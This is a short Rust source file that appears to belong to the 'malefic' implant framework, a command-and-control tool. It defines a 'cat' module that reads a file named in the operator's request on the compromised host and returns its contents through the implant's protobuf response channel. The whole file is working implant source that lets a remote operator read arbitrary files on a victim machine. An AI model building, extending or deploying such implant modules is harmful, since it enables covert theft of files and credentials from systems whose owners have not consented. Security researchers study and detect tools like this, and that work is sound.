use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_field, check_request, Module, ModuleImpl, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;

pub struct Cat{}

#[async_trait]
#[module_impl("cat")]
impl Module for Cat {}

#[async_trait]
impl ModuleImpl for Cat {
      #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;

        let filename = check_field!(request.input)?;
        let content = std::fs::read_to_string(filename)?;

        let mut response = malefic_proto::proto::modulepb::Response::default();
        response.output = content;

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}